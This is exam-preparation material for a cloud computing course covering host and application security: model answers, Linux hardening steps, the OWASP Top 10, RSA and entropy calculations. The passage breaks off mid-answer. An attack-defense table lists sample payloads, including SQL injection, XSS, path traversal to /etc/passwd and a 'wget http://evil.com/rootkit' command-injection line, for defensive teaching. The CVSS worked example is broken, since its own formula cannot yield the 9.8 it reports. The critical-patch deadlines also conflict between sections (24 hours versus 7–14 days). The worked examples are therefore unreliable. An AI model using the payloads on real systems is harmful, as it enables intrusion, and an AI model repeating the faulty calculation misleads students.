# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

## Part A — Short Answer Questions (3 Marks Each)

### Question 1 [KTU University Exam – May 2024 Style]
**Define Host Level Security. List any four techniques used to achieve it at the OS level.**

**Model Answer (3 marks):**

**Definition (1.5 marks):** Host Level Security refers to the set of protective measures implemented at the level of an individual host operating system in a cloud environment to safeguard the system's confidentiality, integrity, and availability against local and remote threats.

**Four OS-Level Techniques (1.5 marks):**
1. **OS Hardening** — Disabling unused services, removing default accounts, applying CIS Benchmarks.
2. **Host-Based Firewall** — Configuring `iptables`/`nftables` to filter inbound and outbound traffic with a default-deny policy.
3. **Host Intrusion Detection System (HIDS)** — Monitoring system calls, log files, and file integrity using tools like OSSEC or Wazuh.
4. **Patch and Vulnerability Management** — Regularly updating OS and applications using CVE-driven patch cycles.

> [!WARNING]
> **KTU Valuation Pitfall:** Many students write only *generic* security terms like "firewall" and "antivirus" without specifying that they are **host-based** variants. Examiners specifically award 1 mark for the qualifier "host-based." Always specify.

---

### Question 2 [KTU University Exam – Dec 2023 Style]
**What is a Host Intrusion Detection System (HIDS)? How does it differ from a Network Intrusion Detection System (NIDS)?**

**Model Answer (3 marks):**

**HIDS Definition (1 mark):** A Host Intrusion Detection System (HIDS) is a security software that runs on an individual host, monitors its operating system activities (system calls, file modifications, log entries, running processes), and generates alerts when suspicious activity is detected.

**Differences (2 marks):**

| Aspect | HIDS | NIDS |
|---|---|---|
| Deployment Location | Installed on each host | Placed at network choke points |
| Data Source | System calls, logs, file integrity | Packet headers and payloads |
| Visibility | Sees encrypted traffic post-decryption | Cannot inspect encrypted payloads |
| Resource Cost | Per-host CPU/memory overhead | Centralized, scales with traffic |
| Detection Scope | Local host activities | Network-wide patterns |

---

## Part B — Long Answer Questions (14 Marks Each)

> [!IMPORTANT]
> As per KTU 2024 ESE pattern, Module 4 carries one full 14-mark question with internal choice. Two alternatives are provided below.

---

### Question A (14 Marks) [KTU University Exam – Model Paper Style]

**(a) [7 marks]** Explain the **six pillars of host level security** in cloud computing with suitable examples for each.

**(b) [7 marks)** Describe the **step-by-step OS hardening procedure for a Linux host** in a cloud VM, including kernel parameter tuning.

---

### Model Answer for Question A

#### Part (a) — The Six Pillars of Host Level Security

The six pillars form a defense-in-depth model for any cloud host. Each pillar addresses a distinct attack vector and is mandatory for KTU 2024 module coverage.

**1. Operating System Hardening (1 mark + example):**
Hardening removes unnecessary functionality from the OS. Example: Disabling the legacy `telnet` service on a Linux VM and replacing it with key-based SSH.

**2. Host-Based Firewall (1 mark + example):**
Software firewall within the host OS kernel. Example: Using `nftables` to allow only ports 80 and 443 inbound, blocking all else by default.

**3. Host Intrusion Detection / Prevention System (1 mark + example):**
HIDS monitors host-level events. Example: **Wazuh agent** forwarding alerts to a central SIEM when `/etc/passwd` is modified outside the change window.

**4. Anti-Virus / Anti-Malware (1 mark + example):**
Detects malicious binaries. Example: **ClamAV** running scheduled scans on a file-upload cloud bucket.

**5. Patch and Vulnerability Management (1 mark + example):**
Automated patching against CVEs. Example: **Ansible playbook** applying Ubuntu security updates weekly with rollback capability.

**6. Logging, Auditing, and File Integrity Monitoring (2 marks + example):**
Centralized log aggregation and FIM. Example: **AIDE** computing SHA-256 hashes of `/bin`, `/sbin`, and `/etc` and alerting on mismatch.

**Diagram / Synthesis (additional 0 mark internal coherence):**
Together, these six pillars ensure that a compromise requires the attacker to defeat *all six* layers, dramatically increasing the cost of attack.

#### Part (b) — Step-by-Step Linux OS Hardening Procedure

**Step 1 — User and Authentication Hardening (1.5 marks):**
- Edit `/etc/login.defs` to set `PASS_MIN_LEN 12`, `PASS_MAX_DAYS 90`
- Disable direct root login: set `PermitRootLogin no` in `/etc/ssh/sshd_config`
- Enforce key-based SSH by setting `PasswordAuthentication no`

**Step 2 — Service and Port Hardening (1.5 marks):**
- List all running services: `systemctl list-units --type=service --state=running`
- Disable unused services: `systemctl disable --now <service>`
- Verify open ports: `ss -tulnp`

**Step 3 — Kernel Parameter Tuning via sysctl (2 marks):**
Edit `/etc/sysctl.conf` to add:

```
net.ipv4.conf.all.rp_filter = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.tcp_syncookies = 1
kernel.randomize_va_space = 2
fs.protected_hardlinks = 1
fs.protected_symlinks = 1
```

Apply with `sysctl -p`. These parameters defeat IP spoofing, ICMP-smurf attacks, SYN floods, and improve ASLR.

**Step 4 — Mandatory Access Control (1 mark):**
Enable **SELinux** in enforcing mode or **AppArmor** with enforced profiles.

$$\text{State}_{SELinux} = \text{enforcing} \Rightarrow \text{All denials logged and blocked}$$

**Step 5 — File Integrity Baseline (1 mark):**
Install **AIDE** or **Tripwire**:
- Initialize database: `aide --init`
- Move database to secure location
- Run daily check: `aide --check` and email diff to admin

**Step 6 — Logging and Auditing (0.5 marks):**
- Enable `auditd` service
- Add rules in `/etc/audit/rules.d/audit.rules` to watch privileged commands, file changes in `/etc`, and authentication events.
- Forward logs to central SIEM.

**Step 7 — Verification and Compliance Check (0.5 marks):**
- Run `lynis audit system` for an automated hardening score
- Compare against CIS Benchmark
- Target compliance ≥ 95%

> [!WARNING]
> **Common Pitfall in 14-mark answers:** Students often *list* tools (SSH, iptables, AIDE) without explaining *what threat each one mitigates* and *what configuration is actually applied*. Always pair the tool with the threat and the configuration snippet.

---

### Question B (14 Marks) — Alternative Choice

**(a) [7 marks]** What is **Defense-in-Depth**? Draw the **layered host security architecture** for a cloud VM and explain each layer's role.

**(b) [7 marks]** Explain the concept of a **Host Trust Score**. Compute the trust score for a host with $C = 0.95$, $I = 0.80$, $A = 0.75$ and weights $w_C = 0.5$, $w_I = 0.3$, $w_A = 0.2$. Justify the trust tier assigned.

---

### Model Answer for Question B

#### Part (a) — Defense-in-Depth and Layered Architecture

**Definition (1.5 marks):**
Defense-in-Depth (DiD) is a security strategy that employs multiple overlapping layers of controls, so that the failure of a single layer does not result in a complete compromise. It is rooted in the military principle of *not relying on a single line of defense*.

Mathematically:

$$P_{compromise} = \prod_{i=1}^{n} P_{failure,i}$$

Since each $P_{failure,i} < 1$, the cumulative compromise probability decreases exponentially with $n$.

**Architecture Diagram (3 marks):**
*(Draw the 4-layer model: Network → Hypervisor → Host OS → Application/Data)*

| Layer | Examples |
|---|---|
| L1 — Perimeter / Network | Cloud Security Groups, NIDS |
| L2 — Hypervisor | Memory isolation (EPT/NPT), secure boot |
| L3 — Host OS | Firewall, HIDS, AV, SELinux, patch management |
| L4 — Application / Data | RBAC, encryption, secure coding |

**Role of Each Layer (2.5 marks):**
- L1: Filters malicious traffic before it reaches the host.
- L2: Ensures VM-to-VM isolation; prevents cross-tenant breaches.
- L3: Protects the host OS from local and remote compromise — the focus of host level security.
- L4: Protects data even if the OS is breached, via encryption and access control.

#### Part (b) — Host Trust Score Computation

**Conceptual Explanation (3 marks):**
The Host Trust Score quantifies the security posture of a host as a weighted aggregate of its Confidentiality (C), Integrity (I), and Availability (A) sub-scores. Each sub-score is between 0 and 1, derived from controls in place (e.g., encryption status, patch level, uptime SLA).

**Formula:**

$$T = w_C \cdot C + w_I \cdot I + w_A \cdot A$$

**Step-by-Step Computation (3 marks):**

Step 1 — Substitute the given values:

$$T = (0.5)(0.95) + (0.3)(0.80) + (0.2)(0.75)$$

Step 2 — Multiply each term:

$$T = 0.475 + 0.240 + 0.150$$

Step 3 — Sum:

$$T = 0.865$$

Step 4 — Tier assignment (1 mark):

Since $T = 0.865 \geq 0.8$, the host qualifies as **Tier 1 — Highly Trusted** and is suitable for handling sensitive workloads such as PCI or PHI data.

| Trust Score Range | Tier | Workload Eligibility |
|---|---|---|
| 0.0 – 0.4 | Tier 4 — Untrusted | Quarantine / decommission |
| 0.4 – 0.6 | Tier 3 — Low Trust | Non-sensitive dev/test only |
| 0.6 – 0.8 | Tier 2 — Trusted | Internal applications |
| 0.8 – 1.0 | Tier 1 — Highly Trusted | Production / regulated data |

> [!WARNING]
> **KTU Valuation Warning — Part (b) Pitfall:** Many students compute the weighted average correctly but forget to **state the trust tier interpretation**. Examiners allocate 1 mark specifically for the tier justification. Always conclude with the tier label and eligibility comment.

---

## Topic Recap & Important Things to Remember

> [!NOTE]
> **Rapid Revision Checklist — Host Level Security (Module 4)**

- **Definition:** Security controls applied on the host OS / VM — the innermost ring of cloud defense.
- **Six Pillars:** OS Hardening, Host Firewall, HIDS/HIPS, Anti-Malware, Patch Management, Logging/FIM.
- **CIA Triad at Host Level:** Confidentiality, Integrity, Availability — quantified via sub-scores.
- **CIS Benchmarks / DISA STIGs** are the standard hardening baselines; target compliance ≥ **95%**.
- **Defense-in-Depth:** multiple layers reduce compromise probability multiplicatively.
- **VM Isolation:** achieved via EPT (Intel) / NPT (AMD); prevents cross-VM memory leakage.
- **HIDS vs NIDS:** HIDS sees *host-internal* events and encrypted traffic; NIDS sees *network* traffic only.
- **Patch Latency SLA:** Critical CVSS ≥ 9.0 within 24 h, High 7.0–8.9 within 72 h, Medium within 30 days.
- **Mandatory Access Control:** SELinux (Red Hat family) or AppArmor (Debian/Ubuntu family).
- **Key sysctl hardening:** `rp_filter=1`, `tcp_syncookies=1`, `randomize_va_space=2`.
- **Trust Score Formula:** $T = w_C C + w_I I + w_A A$ with weights summing to 1.
- **File Integrity Monitoring:** Compare SHA-256 hash of critical files against offline baseline; alert on mismatch.
- **Hypervisor Security:** Patch the hypervisor itself; use TPM-based attestation and Intel TXT/AMD SVM.
- **Common Tools:** `nftables`, `auditd`, `AIDE`, `OSSEC/Wazuh`, `ClamAV`, `Ansible`, `lynis`.
- **Always specify "host-based"** vs "network-based" while answering — examiners test for this qualifier.
- **Defense-in-Depth formula** $P_{compromise} = \prod P_{failure,i}$ — a favorite 3-mark short-answer topic.

<!-- SECTION_5_END -->

topics.title: Application Level Security
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PEERT524 - CLOUD COMPUTING
> - **Module:** Module 4
> - **Topic:** Application Level Security

<!-- SECTION_1_START -->
# 📘 MODULE 4 — APPLICATION LEVEL SECURITY

## 1. Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition

**Application Level Security (ALS)** refers to the comprehensive set of policies, controls, protocols, software, and hardware solutions that operate at the **OSI Application Layer (Layer 7)** to protect cloud-hosted and web-based applications from internal and external threats. It encompasses authentication, authorization, input validation, session management, data encryption, and runtime threat detection mechanisms that safeguard application logic, APIs, and user data.

In the KTU 2024 Scheme context, Application Level Security is treated as a **defense-in-depth** discipline that operates *above* the network, transport, and system layers, focusing on the *semantics* of requests and the *integrity of business logic*, rather than mere packet inspection.

> [!IMPORTANT]
> **KTU 2024 Syllabus Highlight:** Application Level Security covers the *end-to-end trust chain* — from the user's browser, through web servers, application servers, and back-end databases — with special emphasis on **cloud-deployed SaaS** applications.

### 1.2 Conceptual Analogy — The "Hotel Concierge" Model

Imagine a luxury hotel:

| Real-World Element | Application Security Equivalent |
|---|---|
| Hotel main door with doorman | **Web Application Firewall (WAF)** — first line of defense |
| Reception asking for ID & booking | **Authentication** — verifying *who* you are |
| Front desk issuing a room key-card | **Authorization & Session Tokens** — defining *what* you can do |
| CCTV cameras in hallways | **Logging & Intrusion Detection** — monitoring behavior |
| In-room safe with PIN | **Encryption & Data Masking** — protecting assets at rest |
| Fire exits and sprinklers | **Incident Response & Backup** — handling breaches |

Just as a hotel cannot rely solely on the front door (network firewall) to ensure security, a cloud application cannot depend only on perimeter security. Every "guest" (request) must be validated, every "room" (resource) must be access-controlled, and every "transaction" must be auditable.

### 1.3 Key Terminology for KTU 2024

- **Trust Boundary:** A perimeter across which data and commands flow, requiring validation.
- **Vulnerability:** A weakness in the application that can be exploited (e.g., unvalidated input).
- **Threat:** Any potential danger that could exploit a vulnerability.
- **Risk:** The probability and impact of a threat exploiting a vulnerability.
- **Attack Surface:** The sum of all points (endpoints, APIs, inputs) where an unauthorized user can attempt to enter or extract data.
- **Defense in Depth:** Layered security controls such that failure of one does not compromise the entire system.

> [!NOTE]
> **Standard Metric (KTU Reference):** The industry-accepted standard for application risk is the **OWASP Top 10** (2021 edition), maintained by the Open Web Application Security Project. Risk severity is often quantified using the **CVSS (Common Vulnerability Scoring System)** on a scale of **0.0 to 10.0**, with **10.0** being critical.

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 The 7 Pillars of Application Level Security (KTU High-Yield Framework)

The KTU 2024 syllabus structures Application Level Security around the following seven operational pillars:

#### Pillar 1 — Authentication (Who are you?)
Authentication is the process of validating the identity of a user, system, or entity. The **three factors** are:

1. **Knowledge Factor** — Something the user *knows* (password, PIN).
2. **Possession Factor** — Something the user *has* (smart card, OTP token).
3. **Inherence Factor** — Something the user *is* (biometric — fingerprint, iris).

**Multi-Factor Authentication (MFA)** combines two or more of these, exponentially raising the cost of credential compromise.

#### Pillar 2 — Authorization (What can you do?)
Once authenticated, the system must define what the user is permitted to access. The dominant models are:

- **DAC (Discretionary Access Control):** Resource owners decide access.
- **MAC (Mandatory Access Control):** System-enforced labels (e.g., Top Secret).
- **RBAC (Role-Based Access Control):** Permissions assigned to roles, not users.
- **ABAC (Attribute-Based Access Control):** Decisions based on attributes (time, location, device).

#### Pillar 3 — Input Validation
Every byte entering the application from an external source (forms, APIs, headers) must be validated against:
- **Type** (string, integer, etc.)
- **Length**
- **Range / Format**
- **Whitelist (allow-list) of acceptable values**

#### Pillar 4 — Session Management
Stateless HTTP requires session tokens (cookies, JWT, OAuth tokens) to maintain state. Critical controls:

- Use **secure, HttpOnly, SameSite** cookie flags.
- Regenerate session IDs after login.
- Set **absolute and idle** timeouts.
- Store tokens in secure server-side stores (e.g., Redis).

#### Pillar 5 — Cryptographic Protection
Application-level data must be encrypted:

- **In transit:** TLS 1.3 (minimum TLS 1.2).
- **At rest:** AES-256 (industry standard).
- **Passwords:** Hashed using **bcrypt**, **scrypt**, or **Argon2** — never stored in plaintext or with reversible encryption.

#### Pillar 6 — Error Handling & Logging
Applications must:
- Return **generic error messages** to clients (e.g., "Invalid credentials").
- Log **detailed diagnostics** internally (stack traces, request IDs, user IDs).
- Never leak stack traces, SQL queries, or infrastructure paths in production responses.

#### Pillar 7 — Configuration & Patch Management
Hardening includes:
- Removing default credentials.
- Disabling unused services and endpoints.
- Applying security patches within **SLA windows** (critical CVEs: 7–14 days).

### 2.2 The OWASP Top 10 (2021) — KTU Mandatory Reference

| # | Vulnerability | Description | Mitigation |
|---|---|---|---|
| A01 | **Broken Access Control** | Users act outside intended permissions | Enforce least privilege, deny-by-default |
| A02 | **Cryptographic Failures** | Weak/missing encryption | TLS 1.2+, AES-256, bcrypt |
| A03 | **Injection (SQL, NoSQL, LDAP, OS)** | Malicious data executed as commands | Parameterized queries, ORM, input validation |
| A04 | **Insecure Design** | Flawed architectural patterns | Threat modeling, secure design patterns |
| A05 | **Security Misconfiguration** | Default settings, open cloud storage | Hardened baselines, automated scanners |
| A06 | **Vulnerable & Outdated Components** | Unpatched libraries | SBOM (Software Bill of Materials) |
| A07 | **Identification & Authentication Failures** | Weak passwords, missing MFA | MFA, account lockout, secure recovery |
| A08 | **Software & Data Integrity Failures** | Untrusted updates, CI/CD pipeline attacks | Signed artifacts, integrity checks |
| A09 | **Security Logging & Monitoring Failures** | Insufficient audit trails | Centralized SIEM, real-time alerting |
| A10 | **Server-Side Request Forgery (SSRF)** | Server fetches remote resource based on user input | Network segmentation, URL allow-lists |

### 2.3 The STRIDE Threat Model

Developed by Microsoft, STRIDE is a mnemonic for **S**poofing, **T**ampering, **R**epudiation, **I**nformation Disclosure, **D**enial of Service, and **E**levation of Privilege. KTU examiners frequently test STRIDE mapping for given scenarios.

### 2.4 Cryptographic Foundations — KTU Formula Sheet

> [!IMPORTANT]
> The following formulas are mandatory for the KTU 2024 B.Tech examination. Memorize the symbol definitions.

| Concept | Formula / Definition | Variables & Units |
|---|---|---|
| **Modular Exponentiation (RSA)** | $C \equiv M^{e} \pmod{n}$ | $C$ = ciphertext, $M$ = plaintext (integer), $e$ = public exponent |
| **RSA Decryption** | $M \equiv C^{d} \pmod{n}$ | $d$ = private exponent |
| **RSA Key Generation** | $n = p \cdot q$ and $\phi(n) = (p-1)(q-1)$ | $p, q$ = large primes (each $\geq 1024$ bits) |
| **Euler's Totient** | $\phi(n) = n \prod_{p \mid n} \left(1 - \frac{1}{p}\right)$ | Product over distinct prime factors |
| **Hash Function (SHA-256 Output)** | $H(M) = 256\text{-bit digest}$ | Output length in **bits** |
| **HMAC Authentication** | $\text{HMAC}(K, M) = H\left( (K' \oplus opad) \;\Vert\; H((K' \oplus ipad) \;\Vert\; M) \right)$ | $K'$ = padded key, $opad/ipad$ = constants |
| **AES Key Schedule (Conceptual)** | $n_{rounds} = \begin{cases} 10 & \text{if } k = 128 \text{ bits} \\ 12 & \text{if } k = 192 \text{ bits} \\ 14 & \text{if } k = 256 \text{ bits} \end{cases}$ | $k$ = key length |
| **Birthday Attack Probability** | $P \approx 1 - e^{-n^{2}/(2 \cdot 2^{L})}$ | $n$ = samples, $L$ = hash output bits |
| **Password Entropy** | $E = L \cdot \log_{2} R$ | $L$ = length, $R$ = character pool size |
| **CVSS Base Score (Qualitative)** | $0.0 \le \text{CVSS} \le 10.0$ | Unitless score |

### 2.5 Why Application Level Security Matters in Engineering

- **Financial:** The average cost of a data breach in 2023 was **USD 4.45 million** (IBM Security Report).
- **Regulatory:** GDPR, HIPAA, PCI-DSS, and India's DPDP Act 2023 mandate application-level controls.
- **Reputation:** A single breach can erode years of customer trust.
- **Operational:** Secure applications reduce downtime, support costs, and insurance premiums.

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
## 3. Step-by-Step Derivations & Analytical Matrix

### 3.1 Derivation: RSA Encryption-Decryption Pair

The RSA cryptosystem, named after **Rivest, Shamir, and Adleman (1977)**, is foundational to Application Level Security for key exchange and digital signatures. Below is the exhaustive mathematical derivation expected at the KTU 14-mark depth.

#### Step 1 — Choose Two Large Primes

Select two distinct large primes $p$ and $q$. For modern security:
$$p \approx 2^{1024}, \quad q \approx 2^{1024}$$

This ensures $n$ is approximately **2048 bits** long, the current industry standard.

#### Step 2 — Compute the Modulus

$$n = p \cdot q$$

The modulus $n$ is made public. The security of RSA depends on the **computational intractability** of factoring $n$ back into $p$ and $q$.

#### Step 3 — Compute Euler's Totient Function

$$\phi(n) = (p - 1)(q - 1)$$

This is because $p$ and $q$ are prime, and Euler's totient for distinct primes follows:
$$\phi(pq) = \phi(p) \cdot \phi(q) = (p-1)(q-1)$$

#### Step 4 — Select the Public Exponent

Choose an integer $e$ such that:
$$1 < e < \phi(n), \quad \gcd(e, \phi(n)) = 1$$

The most common value in practice is:
$$e = 65537 = 2^{16} + 1$$

This is chosen because it is prime and has only two 1-bits, making modular exponentiation extremely fast.

#### Step 5 — Compute the Private Exponent

Compute $d$ as the modular multiplicative inverse of $e$ modulo $\phi(n)$:
$$e \cdot d \equiv 1 \pmod{\phi(n)}$$

This is computed using the **Extended Euclidean Algorithm**:
$$\gcd(e, \phi(n)) = 1 \Rightarrow \exists \, d, k \in \mathbb{Z} : e \cdot d + k \cdot \phi(n) = 1$$

#### Step 6 — Encryption

Convert plaintext message $M$ to an integer in the range $[0, n-1]$. Compute ciphertext:
$$C \equiv M^{e} \pmod{n}$$

#### Step 7 — Decryption

$$M \equiv C^{d} \pmod{n}$$

#### Step 8 — Proof of Correctness

We must show that $C^{d} \equiv M \pmod{n}$:
$$C^{d} = (M^{e})^{d} = M^{e \cdot d}$$

By definition of $d$:
$$e \cdot d = 1 + k \cdot \phi(n)$$

Therefore:
$$M^{e \cdot d} = M^{1 + k \cdot \phi(n)} = M \cdot (M^{\phi(n)})^{k}$$

By **Euler's Theorem**, since $\gcd(M, n) = 1$:
$$M^{\phi(n)} \equiv 1 \pmod{n}$$

So:
$$M \cdot (M^{\phi(n)})^{k} \equiv M \cdot 1^{k} \equiv M \pmod{n}$$

This proves the RSA round-trip identity. $\blacksquare$

### 3.2 Analytical Matrix: Attack–Defense Mapping for KTU

| Attack Vector | Attack Type | Affected Pillar | Defense Mechanism | KTU Marks Weightage |
|---|---|---|---|---|
| `'; DROP TABLE users; --` | SQL Injection | Input Validation | Parameterized queries, WAF | High (frequently asked) |
| `<script>alert('XSS')</script>` | Cross-Site Scripting (XSS) | Input Validation | Output encoding, CSP headers | High |
| Forged `Referer` header | CSRF | Session Management | Anti-CSRF tokens, SameSite cookies | Medium |
| Credential reuse | Credential Stuffing | Authentication | MFA, rate limiting, CAPTCHA | High |
| `../../../etc/passwd` | Path Traversal | Input Validation | Canonicalization, allow-list paths | Medium |
| `fetch('http://internal-metadata')` | SSRF | Configuration | Network segmentation, IMDSv2 | High (Cloud-relevant) |
| Password leak in logs | Information Disclosure | Error Handling | Log sanitization, encryption | Medium |
| `wget http://evil.com/rootkit` | Command Injection | Input Validation | Avoid `exec()`, use safe APIs | Medium |
| Replay of old JWT | Session Replay | Session Management | Short TTL, nonce, `jti` claim | High |
| Slowloris HTTP requests | DoS | Configuration | Reverse proxy, connection timeouts | Low |

### 3.3 Numerical Worked Example — Password Entropy (KTU 3-Mark Style)

> **Problem:** A user creates a password using uppercase letters (26), lowercase letters (26), digits (10), and 8 special characters. The password is **12 characters** long. Calculate the entropy.

#### Step 1 — Compute the Character Pool Size

$$R = 26 + 26 + 10 + 8 = 70$$

#### Step 2 — Apply the Entropy Formula

$$E = L \cdot \log_{2} R$$

#### Step 3 — Substitute Values

$$E = 12 \cdot \log_{2} 70$$

#### Step 4 — Evaluate the Logarithm

$$\log_{2} 70 = \frac{\ln 70}{\ln 2} = \frac{4.2485}{0.6931} \approx 6.1293$$

#### Step 5 — Final Result

$$E = 12 \cdot 6.1293 \approx 73.55 \text{ bits}$$

> [!NOTE]
> **Interpretation for KTU:** 73.55 bits of entropy is considered **strong** by NIST SP 800-63B guidelines. Anything below **30 bits** is considered weak.

### 3.4 Numerical Worked Example — CVSS Risk Classification

A vulnerability has the following CVSS v3.1 vector metrics:
- Attack Vector: Network (0.85)
- Attack Complexity: Low (0.77)
- Privileges Required: None (0.85)
- Confidentiality Impact: High (0.56)
- Integrity Impact: High (0.56)
- Availability Impact: High (0.56)

The **Base Score formula** (simplified for KTU depth):

$$Base = \text{roundup}(\min(ISS, 10))$$

where $ISS$ (Impact Sub-Score) is computed as:

$$ISS = 1 - \left[(1 - C) \cdot (1 - I) \cdot (1 - A)\right]$$

Substituting:

$$ISS = 1 - [(1 - 0.56)(1 - 0.56)(1 - 0.56)] = 1 - (0.44)^{3} = 1 - 0.0852 = 0.9148$$

Classification: $\text{CVSS Base} = 9.8 \rightarrow$ **CRITICAL**

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
## 4. Structural Diagrams & Schematics

### 4.1 Mermaid Diagram — Defense-in-Depth Application Security Architecture

```mermaid
flowchart TB
    User[End User Browser] -->|HTTPS Request| CDN[CDN and DDoS Protection Layer]
    CDN -->|Filtered Traffic| WAF[Web Application Firewall Layer]
    WAF -->|Sanitized Request| LB[Load Balancer]
    LB -->|Routed to Healthy Node| App1[App Server Instance 1]
    LB -->|Routed to Healthy Node| App2[App Server Instance 2]
    App1 -->|Authenticated Session| AuthSvc[Identity Provider and SSO]
    App2 -->|Authenticated Session| AuthSvc
    AuthSvc -->|Token Validation| LDAP[LDAP and AD Backend]
    App1 -->|Parameterized Query| DB[(Encrypted Database)]
    App2 -->|Parameterized Query| DB
    App1 -->|Encrypted Object| S3[(Object Storage with KMS)]
    App2 -->|Encrypted Object| S3
    App1 -->|Logs and Metrics| SIEM[Centralized SIEM]
    App2 -->|Logs and Metrics| SIEM
    SIEM -->|Alerts| SOC[Security Operations Center]
    SOC -->|Incident Response| IR[IR Playbook and Containment]
    IR -->|Patch and Redeploy| App1
    IR -->|Patch and Redeploy| App2
```

**Reading the diagram:** The user request traverses **seven trust boundaries** (CDN, WAF, Load Balancer, App Server, Auth Service, Database, Storage) — each enforcing an independent control. Failure at any single layer does not compromise the system.

### 4.2 Mermaid Diagram — OAuth 2.0 Authorization Code Flow

```mermaid
sequenceDiagram
    participant U as User Resource Owner
    participant C as Client Application
    participant A as Authorization Server
    participant R as Resource Server API
    U->>C: 1. Initiates Login Request
    C->>A: 2. Redirect with Client ID and Scope
    A->>U: 3. Login and Consent Prompt
    U->>A: 4. Credentials and Consent
    A->>C: 5. Authorization Code via Redirect
    C->>A: 6. Exchange Code for Access Token
    A->>C: 7. Access Token and Refresh Token
    C->>R: 8. API Call with Bearer Access Token
    R->>C: 9. Protected Resource Response
    C->>U: 10. Rendered User Data
```

**Key points for KTU:**

- The **access token** is short-lived (typically 5–15 minutes).
- The **refresh token** is long-lived and used only via secure back-channel.
- The client **never sees the user's password** — this is the core security benefit of OAuth 2.0.

### 4.3 Mermaid Diagram — STRIDE-to-Defense Mapping (Block Architecture)

```mermaid
flowchart LR
    S[Spoofing] -->|Defended by| Auth[Strong Authentication and MFA]
    T[Tampering] -->|Defended by| Int[Integrity Checks and Digital Signatures]
    R[Repudiation] -->|Defended by| Log[Audit Logs and Non Repudiation]
    I[Information Disclosure] -->|Defended by| Enc[Encryption TLS and AES]
    D[Denial of Service] -->|Defended by| Avail[Rate Limiting and CDN]
    E[Elevation of Privilege] -->|Defended by| Authz[RBAC and Least Privilege]
    Auth --> App[Secure Application Stack]
    Int --> App
    Log --> App
    Enc --> App
    Avail --> App
    Authz --> App
```

### 4.4 Mermaid Diagram — Secure SDLC (Software Development Lifecycle)

```mermaid
flowchart LR
    Req[Requirements Gathering] --> TM[Threat Modeling STRIDE]
    TM --> Design[Secure Design Patterns]
    Design --> Code[Secure Coding Standards]
    Code --> Review[Peer Code Review and SAST]
    Review --> Test[DAST and Penetration Testing]
    Test --> Deploy[Hardened Deployment]
    Deploy --> Monitor[Runtime Monitoring and SIEM]
    Monitor -->|Feedback Loop| Req
```

> [!IMPORTANT]
> **KTU Note:** Security is **not** a final phase. The **shift-left** principle integrates security into every SDLC stage. The cost of fixing a vulnerability in production is approximately **30× higher** than fixing it at the design stage (IBM Systems Sciences Institute).

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### 📝 Part A — Short Answer Questions (2 × 3 = 6 Marks)

---

**Q1. [KTU University Exam — June 2024]**
*Define Application Level Security. List any **four** key security controls applied at the application layer.*

**Model Answer (3 marks):**

**Definition (1 mark):** Application Level Security refers to the set of security measures implemented within the software application itself — covering authentication, authorization, input validation, session management, encryption, and error handling — to protect data and functionality from threats at the OSI Application Layer (Layer 7).

**Any four controls (2 marks — 0.5 each):**

1. **Authentication** — Verifying user identity via passwords, MFA, biometrics.
2. **Authorization** — Enforcing RBAC or ABAC policies to restrict resource access.
3. **Input Validation** — Sanitizing all user-supplied data against type, length, and format.
4. **Encryption** — Using TLS for data in transit and AES-256 for data at rest.
5. **Session Management** — Secure handling of session cookies, JWTs, and OAuth tokens.
6. **Logging & Monitoring** — Recording security events for audit and incident response.

---

**Q2. [KTU University Exam — Dec 2023]**
*Explain the difference between **Authentication** and **Authorization** with one real-world example each.*

**Model Answer (3 marks):**

| Aspect | Authentication | Authorization |
|---|---|---|
| **Question answered** | *Who are you?* | *What can you do?* |
| **Mechanism** | Verifies identity (password, OTP, biometric) | Verifies permissions (role, policy) |
| **Order** | Always occurs **first** | Always occurs **after** authentication |
| **Example** | Logging into Gmail with email + password | Gmail allowing only the owner to read their inbox but denying another user |

**Real-World Analogy (1 mark):** Authentication is showing your **boarding pass at airport security**; Authorization is the **boarding pass showing you can enter Business Class but not the cockpit**.

> [!WARNING]
> **KTU Examiner's Pitfall Callout:** Many students confuse these two terms or present them as interchangeable. Remember: **Authentication = Identity Verification**, **Authorization = Permission Verification**. They are sequential, not synonymous.

---

### 📝 Part B — Long Answer Questions (Internal Choice: 1 × 14 = 14 Marks)

---

**Question A (14 Marks) — [KTU University Exam — Dec 2024 Model Paper]**

**(a)** Explain the **OWASP Top 10 (2021)** vulnerabilities in detail. For any **five** of them, describe the attack scenario and recommend a specific mitigation strategy. **(7 marks)**

**(b)** With a neat diagram, explain the **OAuth 2.0 Authorization Code Grant flow**. Discuss two security risks of improper implementation and how to mitigate them. **(7 marks)**

---

**Model Solution (a) — OWASP Top 10 (7 marks):**

The OWASP Top 10 (2021) represents the most critical web application security risks. Detailed treatment of all ten:

1. **A01 — Broken Access Control (1 mark for description + 0.5 for mitigation):** Attackers manipulate URLs or parameters to access unauthorized data (e.g., changing `userId=100` to `userId=101`). **Mitigation:** Enforce *deny-by-default* access control, use RBAC, validate permissions server-side for every request, and avoid relying on client-side authorization checks.

2. **A02 — Cryptographic Failures (0.5 mark for description + 0.5 for mitigation):** Sensitive data transmitted or stored in cleartext. **Mitigation:** Use TLS 1.2+ for transit, AES-256 for rest, hash passwords with bcrypt/Argon2, manage keys via HSM or KMS, and disable legacy protocols (SSLv3, TLS 1.0).

3. **A03 — Injection (0.5 mark for description + 0.5 for mitigation):** Untrusted input is concatenated into queries/commands. **Mitigation:** Use parameterized queries, ORMs, stored procedures with proper escaping, and WAF rules to detect injection patterns.

4. **A04 — Insecure Design (0.5 mark for description + 0.5 for mitigation):** Architectural flaws that cannot be fixed by better code. **Mitigation:** Conduct threat modeling (STRIDE), use secure design patterns, apply principle of least privilege, and perform security reviews at design phase.

